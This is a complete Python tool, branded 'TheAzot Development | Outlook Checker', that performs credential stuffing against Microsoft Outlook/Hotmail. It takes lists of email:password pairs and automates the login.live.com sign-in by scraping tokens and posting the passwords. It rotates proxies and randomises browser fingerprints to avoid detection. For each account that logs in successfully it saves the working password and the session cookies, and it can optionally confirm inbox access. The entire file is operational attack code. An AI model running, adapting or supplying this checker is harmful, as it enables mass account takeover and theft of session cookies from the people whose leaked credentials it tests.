import sys
import requests
import re
import time
import urllib.parse
import uuid
import os
import logging
import random
import requests
from requests.exceptions import RequestException


ACCOUNTS_FILE = "acc.txt"  # File with accounts in login:password format
VALID_DIR = "valid"  # Directory for saving valid accounts
INVALID_FILE = "invalid.txt"  # File for invalid accounts
PROXIES_FILE = "proxies.txt"  # File with proxies in ip:port or user:pass@ip:port format
USE_PROXIES = False  # Whether to use proxies
PROXY_FORMAT = "http"  # Proxy format (http, socks4, socks5)
CHECK_MAIL = False  # Whether to check mailbox access (to confirm validity)

# Configure enhanced logging
log_format = '[%(asctime)s] %(levelname)s: %(message)s'
log_handlers = [
    logging.FileHandler("outlook_checker.log", mode='a', encoding='utf-8'),
    logging.StreamHandler()
]

# Create logger
logging.basicConfig(
    level=logging.INFO,
    format=log_format,
    datefmt='%H:%M:%S',
    handlers=log_handlers
)
logger = logging.getLogger("OutlookChecker")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.2554.0 Safari/537.36",
]

ACCEPT_LANGUAGES = [
    "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-US,en;q=0.9,ru;q=0.8",
    "en-GB,en;q=0.9,en-US;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
]


class OutlookClient:
    """
    Client for logging into Outlook/Hotmail and working with Microsoft email services
    """

    def __init__(self, email, password, proxy=None):
        """
        Initialize the client

        Args:
            email (str): Email address for login
            password (str): Password
            proxy (str): Proxy in format http://user:pass@ip:port or socks5://ip:port
        """
        self.email = email
        self.password = password
        self.session = requests.Session()

        if proxy:
            self.session.proxies = {
                "http": proxy,
                "https": proxy
            }
            self.session.timeout = 30

        user_agent = random.choice(USER_AGENTS)
        accept_language = random.choice(ACCEPT_LANGUAGES)
        chrome_version = random.randint(130, 135)

        self.headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': accept_language,
            'sec-ch-ua': f'"Chromium";v="{chrome_version}", "Not:A-Brand";v="24", "Google Chrome";v="{chrome_version}"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Connection': 'keep-alive'
        }

        self.is_authenticated = False
        self.auth_tokens = {}

    def get_cookies_dict(self):
        """Safely converts session cookies to a dictionary, avoiding duplication errors"""
        cookie_dict = {}
        for cookie in self.session.cookies:
            cookie_dict[cookie.name] = cookie.value
        return cookie_dict

    def save_cookies_to_file(self, filename):
        """Saves cookies to a Netscape format file"""
        cookies_netscape_format = []
        seen_cookies = set()

        for cookie in self.session.cookies:
            cookie_key = (cookie.domain, cookie.path, cookie.name)
            if cookie_key in seen_cookies:
                continue
            seen_cookies.add(cookie_key)

            domain = cookie.domain
            flag = 'TRUE'
            path = cookie.path
            secure = 'TRUE' if cookie.secure else 'FALSE'
            expires = cookie.expires if cookie.expires else '1797150852'
            name = cookie.name
            value = cookie.value

            cookies_netscape_format.append(f"{domain}\t{flag}\t{path}\t{secure}\t{expires}\t{name}\t{value}")

        os.makedirs(os.path.dirname(os.path.abspath(filename)), exist_ok=True)

        with open(filename, 'w', encoding='utf-8') as f:
            f.write('\n'.join(cookies_netscape_format))

        logger.info(f"Saved {len(seen_cookies)} cookies to {os.path.basename(filename)}")

    def login(self):
        """
        Performs login to Outlook/Hotmail

        Returns:
            bool: Login success status
        """
        logger.info(f"Attempting login for {self.email}")

        client_id = str(uuid.uuid4()).replace('-', '').upper()

        self.session.cookies.set("MSPPre", "MSPPre", domain=".live.com")

        login_url = "https://login.live.com/login.srf"
        params = {
            'wa': 'wsignin1.0',
            'rpsnv': '14',
            'id': '292841',
            'wreply': 'https://account.microsoft.com/auth/complete-signin',
            'wp': 'MBI_SSL',
            'lc': '1033',
            'ct': str(int(time.time())),
            'rver': '7.0.6737.0',
            'uaid': str(uuid.uuid4()).replace('-', ''),
            'clientid': client_id,
            'bk': str(int(time.time()))
        }

        response = self.session.get(login_url, headers=self.headers, params=params, allow_redirects=True)

        if response.status_code != 200:
            logger.error(f"Error getting login page: {response.status_code}")
            return False

        ppft_match = re.search(r'name="PPFT" id="i0327" value="([^"]*)"', response.text)
        if not ppft_match:
            logger.error("PPFT token not found on login page")
            return False

        ppft = ppft_match.group(1)

        url_post_match = re.search(r'urlPost:\'([^\']*)', response.text)
        url_post = url_post_match.group(1) if url_post_match else None

        if not url_post:
            logger.error("URL for data submission not found")
            return False

        context_id_match = re.search(r'contextid=([^&]*)', url_post)
        opid_match = re.search(r'opid=([^&]*)', url_post)
        bk_match = re.search(r'bk=([^&]*)', url_post)

        context_id = context_id_match.group(1) if context_id_match else ""
        opid = opid_match.group(1) if opid_match else ""
        bk = bk_match.group(1) if bk_match else str(int(time.time()))

        uaid = self.session.cookies.get('uaid', '')
        cred_url = f"https://login.live.com/GetCredentialType.srf?opid={opid}&id=292841&mkt=RU-RU&lc=1049&uaid={uaid}"

        cred_data = {
            "checkPhones": False,
            "country": "",
            "federationFlags": 3,
            "flowToken": ppft,
            "forceotclogin": False,
            "isCookieBannerShown": False,
            "isExternalFederationDisallowed": False,
            "isFederationDisabled": False,
            "isFidoSupported": True,
            "isOtherIdpSupported": False,
            "isRemoteConnectSupported": False,
            "isRemoteNGCSupported": True,
            "isSignup": False,
            "originalRequest": "",
            "otclogindisallowed": False,
            "uaid": uaid,
            "username": self.email
        }

        cred_headers = self.headers.copy()
        cred_headers.update({
            'correlationid': opid,
            'hpgid': '33',
            'hpgact': '0',
            'client-request-id': opid,
            'accept': 'application/json',
            'content-type': 'application/json; charset=utf-8',
            'origin': 'https://login.live.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': response.url
        })

        cred_response = self.session.post(cred_url, headers=cred_headers, json=cred_data)

        if cred_response.status_code != 200:
            logger.error(f"Error checking credentials: {cred_response.status_code}")
            return False

        post_url = f"https://login.live.com/ppsecure/post.srf?contextid={context_id}&opid={opid}&bk={bk}&uaid={uaid}&pid=0"

        post_data = {
            'ps': '2',
            'psRNGCDefaultType': '',
            'psRNGCEntropy': '',
            'psRNGCSLK': '',
            'canary': '',
            'ctx': '',
            'hpgrequestid': '',
            'PPFT': ppft,
            'PPSX': 'PassportRN',
            'NewUser': '1',
            'FoundMSAs': '',
            'fspost': '0',
            'i21': '0',
            'CookieDisclosure': '0',
            'IsFidoSupported': '1',
            'isSignupPost': '0',
            'isRecoveryAttemptPost': '0',
            'i13': '0',
            'login': self.email,
            'loginfmt': self.email,
            'type': '11',
            'LoginOptions': '3',
            'lrt': '',
            'lrtPartition': '',
            'hisRegion': '',
            'hisScaleUnit': '',
            'passwd': self.password
        }

        post_headers = self.headers.copy()
        post_headers.update({
            'origin': 'https://login.live.com',
            'content-type': 'application/x-www-form-urlencoded',
            'referer': response.url
        })

        post_response = self.session.post(post_url, headers=post_headers, data=post_data, allow_redirects=False)

        if post_response.status_code != 200 and not (300 <= post_response.status_code < 400):
            logger.error(f"Error submitting login and password: {post_response.status_code}")
            return False

        current_response = post_response
        redirect_count = 0
        max_redirects = 10

        while 300 <= current_response.status_code < 400 and redirect_count < max_redirects:
            redirect_url = current_response.headers.get('Location')

            if redirect_url.startswith('/'):
                base_url = urllib.parse.urlparse(post_url)
                redirect_url = f"{base_url.scheme}://{base_url.netloc}{redirect_url}"

            # Follow redirect
            redirect_headers = self.headers.copy()
            redirect_headers['Referer'] = current_response.url if hasattr(current_response, 'url') else post_url

            try:
                current_response = self.session.get(redirect_url, headers=redirect_headers, allow_redirects=False)
            except Exception as e:
                logger.error(f"Error following redirect: {str(e)}")
                break

            redirect_count += 1

        check_urls = [
            "https://outlook.live.com/owa/?nlp=1",
            "https://account.microsoft.com/",
            "https://www.microsoft.com/ru-ru",
            "https://onedrive.live.com/",
            "https://www.office.com/",
            "https://login.live.com/login.srf"
        ]

        for url in check_urls:
            check_headers = self.headers.copy()
            check_headers['Referer'] = 'https://login.live.com/'

            try:
                check_response = self.session.get(url, headers=check_headers, allow_redirects=True)
            except Exception as e:
                logger.error(f"Error checking URL {url}: {str(e)}")

        cookies = self.get_cookies_dict()
        essential_cookies = ["WLSSC", "MSPAuth", "RPSSecAuth"]

        if any(cookie in cookies for cookie in essential_cookies):
            logger.info(f"Successful authentication for {self.email}")
            self.is_authenticated = True
            return True
        else:
            logger.warning(f"Failed to get required cookies for {self.email}")
            self.is_authenticated = False
            return False

    def check_mailbox(self):
        """
        Checks access to the mailbox to ensure the account is truly valid

        Returns:
            bool: Check success status
        """
        if not self.is_authenticated:
            logger.error("Authentication required first")
            return False

        logger.info(f"Checking mailbox access for {self.email}")

        inbox_url = "https://outlook.live.com/mail/0/inbox"

        headers = self.headers.copy()
        headers['Referer'] = 'https://outlook.live.com/'

        try:
            response = self.session.get(inbox_url, headers=headers)

            if response.status_code != 200:
                logger.error(f"Error accessing mailbox: {response.status_code}")
                return False

            if 'Outlook' in response.text and ('inbox' in response.text.lower() or 'входящие' in response.text.lower()):
                logger.info(f"Successful mailbox access for {self.email}")
                return True
            else:
                logger.warning(f"Failed to confirm mailbox access for {self.email}")
                return False
        except Exception as e:
            logger.error(f"Error checking mailbox: {str(e)}")
            return False


class AccountChecker:
    """
    Class for checking a list of Outlook/Hotmail accounts
    """

    def __init__(self):
        global USE_PROXIES

        if not os.path.exists(VALID_DIR):
            os.makedirs(VALID_DIR)

        self.proxies = []
        if USE_PROXIES:
            if os.path.exists("working_proxies.txt"):
                with open("working_proxies.txt", 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]

                if self.proxies:
                    logger.info(f"Loaded {len(self.proxies)} verified proxies from working_proxies.txt")
                else:
                    logger.warning("working_proxies.txt exists but is empty. Loading from main file.")

            if not self.proxies and os.path.exists(PROXIES_FILE):
                with open(PROXIES_FILE, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]

                # Add prefix  proxies if format is specified
                if PROXY_FORMAT and PROXY_FORMAT != "http":
                    self.proxies = [f"{PROXY_FORMAT}://{proxy}" if "://" not in proxy else proxy
                                    for proxy in self.proxies]

                logger.info(f"Loaded {len(self.proxies)} proxies from {PROXIES_FILE}")

                self.proxies = self.filter_working_proxies()

            if not self.proxies:
                logger.warning("No working proxies found.")
                user_choice = input("Continue without proxies? (y/n): ").strip().lower()
                if user_choice == 'y':
                    logger.info("Continuing without proxies")
                    USE_PROXIES = False
                else:
                    logger.info("Exiting program...")
                    sys.exit(0)

    def test_proxy(self, proxy):
        """
        Tests proxy functionality with Microsoft services

        Args:
            proxy (str): Proxy string in ip:port or http://ip:port format

        Returns:
            bool: True if proxy works, False otherwise
        """

        test_url = "https://login.live.com/login.srf"

        try:
            # Format proxy correctly
            if "://" not in proxy:
                if PROXY_FORMAT == "http":
                    formatted_proxy = f"http://{proxy}"
                else:
                    formatted_proxy = f"{PROXY_FORMAT}://{proxy}"
            else:
                formatted_proxy = proxy

            proxies = {
                "http": formatted_proxy,
                "https": formatted_proxy
            }

            session = requests.Session()
            session.timeout = 5

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
            }

            response = session.get(test_url, proxies=proxies, headers=headers, timeout=5)
            return response.status_code == 200
        except RequestException as e:
            proxy_display = proxy.split('@')[-1] if '@' in proxy else proxy
            logger.debug(f"Error checking proxy {proxy_display}: {str(e)[:100]}...")
            return False
        except Exception as e:
            proxy_display = proxy.split('@')[-1] if '@' in proxy else proxy
            logger.debug(f"Unknown proxy error {proxy_display}: {str(e)[:100]}...")
            return False

    def filter_working_proxies(self):
        """
        Filters out non-working proxies

        Returns:
            list: List of working proxies
        """
        if not self.proxies:
            logger.warning("Proxy list is empty, nothing to filter")
            return []

        working_proxies = []
        total = len(self.proxies)

        logger.info(f"Testing {total} proxies for functionality...")

        for i, proxy in enumerate(self.proxies):
            if i % 10 == 0:
                logger.info(f"Testing proxy {i + 1}/{total}")

            if self.test_proxy(proxy):
                logger.info(f"✓ Proxy {proxy.split('@')[-1] if '@' in proxy else proxy} works")
                working_proxies.append(proxy)
            else:
                logger.info(f"✗ Proxy {proxy.split('@')[-1] if '@' in proxy else proxy} doesn't work")

        logger.info(f"Found {len(working_proxies)} working proxies out of {total}")

        # Save results to a file for future use
        with open("working_proxies.txt", 'w') as f:
            for proxy in working_proxies:
                f.write(f"{proxy}\n")

        return working_proxies

    def get_random_proxy(self):
        """Returns a random proxy from the list with proper formatting"""
        if not self.proxies:
            return None

        proxy = random.choice(self.proxies)

        if "://" not in proxy:
            if PROXY_FORMAT == "http":
                return f"http://{proxy}"
            else:
                return f"{PROXY_FORMAT}://{proxy}"
        return proxy

    def check_account(self, email, password, max_retries=3):
        """
        Check account validity with retry attempts for proxy issues

        Args:
            email (str): Account email
            password (str): Account password
            max_retries (int): Maximum number of attempts with different proxies

        Returns:
            bool: Account validity
        """
        retry_count = 0

        if not USE_PROXIES or not self.proxies:
            try:
                client = OutlookClient(email, password, None)
                if client.login():
                    if CHECK_MAIL:
                        mailbox_valid = client.check_mailbox()
                        if not mailbox_valid:
                            logger.warning(f"Account {email} passed authorization, but mailbox is inaccessible")
                            self.save_invalid_account(email, password, "auth_ok_but_mailbox_denied")
                            return False

                    self.save_valid_account(email, password, client)
                    return True
                else:
                    self.save_invalid_account(email, password)
                    return False
            except Exception as e:
                logger.error(f"Error without proxy: {str(e)}")
                self.save_invalid_account(email, password, f"error_no_proxy: {str(e)[:100]}")
                return False

        used_proxies = set()

        while retry_count < max_retries and len(used_proxies) < len(self.proxies):
            proxy = None
            attempts = 0
            max_attempts = len(self.proxies)

            while attempts < max_attempts:
                temp_proxy = self.get_random_proxy()
                if temp_proxy not in used_proxies:
                    proxy = temp_proxy
                    used_proxies.add(proxy)
                    break
                attempts += 1

            if proxy is None:
                logger.warning(f"All available proxies ({len(self.proxies)}) have already been used")
                if retry_count == 0:  # If this is the first attempt, try without proxy
                    logger.info(f"Trying without proxy for {email}")
                    try:
                        client = OutlookClient(email, password, None)
                        if client.login():
                            if CHECK_MAIL and not client.check_mailbox():
                                self.save_invalid_account(email, password, "auth_ok_but_mailbox_denied")
                                return False
                            self.save_valid_account(email, password, client)
                            return True
                        else:
                            self.save_invalid_account(email, password)
                            return False
                    except Exception as e:
                        logger.error(f"Error without proxy: {str(e)}")
                        self.save_invalid_account(email, password, f"error_no_proxy: {str(e)[:100]}")
                        return False
                break

            proxy_display = proxy.split('@')[-1] if '@' in proxy else proxy
            logger.info(f"Using proxy: {proxy_display} (attempt {retry_count + 1}/{max_retries})")

            try:
                client = OutlookClient(email, password, proxy)
                login_success = client.login()

                if login_success:
                    if CHECK_MAIL:
                        mailbox_valid = client.check_mailbox()
                        if not mailbox_valid:
                            logger.warning(f"Account {email} passed authorization, but mailbox is inaccessible")
                            self.save_invalid_account(email, password, "auth_ok_but_mailbox_denied")
                            return False

                    self.save_valid_account(email, password, client)
                    return True
                else:
                    self.save_invalid_account(email, password)
                    return False

            except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout,
                    requests.exceptions.ConnectionError, OSError) as e:
                logger.error(f"Proxy error: {str(e)[:150]}...")
                retry_count += 1

                time.sleep(random.uniform(1, 3))

            except Exception as e:
                logger.error(f"Unexpected error: {str(e)[:150]}...")

                retry_count += 1
                time.sleep(random.uniform(1, 3))

        if retry_count >= max_retries or len(used_proxies) >= len(self.proxies):
            logger.warning(f"All proxy attempts for {email} exhausted, trying without proxy")
            try:
                client = OutlookClient(email, password, None)
                if client.login():
                    if CHECK_MAIL and not client.check_mailbox():
                        self.save_invalid_account(email, password, "auth_ok_but_mailbox_denied")
                        return False
                    self.save_valid_account(email, password, client)
                    return True
                else:
                    self.save_invalid_account(email, password)
                    return False
            except Exception as e:
                logger.error(f"Error without proxy: {str(e)}")
                self.save_invalid_account(email, password, f"all_methods_failed: {str(e)[:100]}")
                return False

    def save_valid_account(self, email, password, client):
        """
        Saves information about a valid account

        Args:
            email (str): Account email
            password (str): Account password
            client (OutlookClient): Client with active session
        """
        # Create folder for account
        account_dir = os.path.join(VALID_DIR, email.split('@')[0])
        if not os.path.exists(account_dir):
            os.makedirs(account_dir)

        cookies_file = os.path.join(account_dir, f"{email}.cookies.txt")
        client.save_cookies_to_file(cookies_file)

        account_file = os.path.join(account_dir, f"{email}.txt")
        with open(account_file, 'w') as f:
            f.write(f"{email}:{password}")

        logger.info(f"✓ Account {email} is valid, data saved in {account_dir}")

    def save_invalid_account(self, email, password, reason="auth_failed"):
        """
        Saves information about an invalid account

        Args:
            email (str): Account email
            password (str): Account password
            reason (str): Reason for invalidity
        """
        with open(INVALID_FILE, 'a') as f:
            f.write(f"{email}:{password}:{reason}\n")

        logger.info(f"✗ Account {email} is invalid ({reason})")

    def check_accounts_from_file(self):
        """
        Checks all accounts from file

        Returns:
            tuple: (valid count, total count)
        """
        if not os.path.exists(ACCOUNTS_FILE):
            logger.error(f"Account file {ACCOUNTS_FILE} not found")
            return 0, 0

        valid_count = 0
        total_count = 0

        with open(ACCOUNTS_FILE, 'r') as f:
            accounts = [line.strip() for line in f if line.strip() and ':' in line]

        logger.info(f"Starting verification of {len(accounts)} accounts")

        for account in accounts:
            try:
                email, password = account.split(':', 1)
                total_count += 1

                logger.info(f"[{total_count}/{len(accounts)}] Checking {email}")

                if self.check_account(email, password):
                    valid_count += 1

                time.sleep(random.uniform(1, 3))

            except Exception as e:
                logger.error(f"Error checking account {account}: {str(e)}")

        return valid_count, total_count


# Main function
def main():
    print("=" * 60)
    print(" TheAzot Development | Outlook Checker ".center(60, "="))
    print(" Outlook/Hotmail Account Verification ".center(60, "="))
    print("=" * 60)

    checker = AccountChecker()
    start_time = time.time()
    valid, total = checker.check_accounts_from_file()

    elapsed_time = time.time() - start_time
    minutes = int(elapsed_time // 60)
    seconds = int(elapsed_time % 60)

    print("\n" + "=" * 60)
    print(f" VERIFICATION RESULTS ".center(60, "="))
    print(f" Accounts checked: {total} ".center(60, " "))
    valid_percent = valid / total * 100 if total > 0 else 0
    print(f" Valid: {valid} ({valid_percent:.1f}%) ".center(60, " "))
    print(f" Invalid: {total - valid} ".center(60, " "))
    print(f" Execution time: {minutes} min {seconds} sec ".center(60, " "))
    print("=" * 60)
    print(f"\nValid accounts saved in directory: {VALID_DIR}")
    print(f"Invalid accounts saved in file: {INVALID_FILE}")


if __name__ == "__main__":
    main()